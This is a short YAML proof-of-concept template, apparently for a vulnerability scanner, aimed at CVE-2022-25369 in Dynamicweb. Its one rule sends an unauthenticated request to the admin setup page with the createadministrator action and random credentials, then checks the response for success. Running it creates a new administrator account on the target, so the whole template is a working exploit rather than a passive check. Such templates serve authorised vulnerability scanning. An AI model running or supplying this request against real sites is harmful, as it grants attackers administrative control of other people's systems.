name: yaml-poc-Dynamicweb-Dynamicweb-other-CVE-2022-25369
binding: be9db2ed-63b4-4202-9b7f-8a287741dcef
detail:
    author: system_user
    vulnerability:
        id: 1de97e88-0af5-48ae-9d62-d2d3daa1abe9
        level: critical
transport: http
set:
    f1: string(randomInt(10000, 20000)) + randomLowercase(5)
    f2: string(randomInt(10000, 20000)) + randomLowercase(5)
    f3: string(randomInt(10000, 20000)) + randomLowercase(5)
rules:
    r1:
        request:
            cache: true
            method: GET
            path: /Admin/Access/Setup/Default.aspx?Action=createadministrator&adminusername={{f1}}&adminpassword={{f2}}&adminemail={{f3}}@test.com&adminname=test
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("json") && "\"[sS]+uccess\":\\s?true".bmatches(response.body) && response.headers["set-cookie"].contains("ASP.NET_SessionId")
expression: r1()
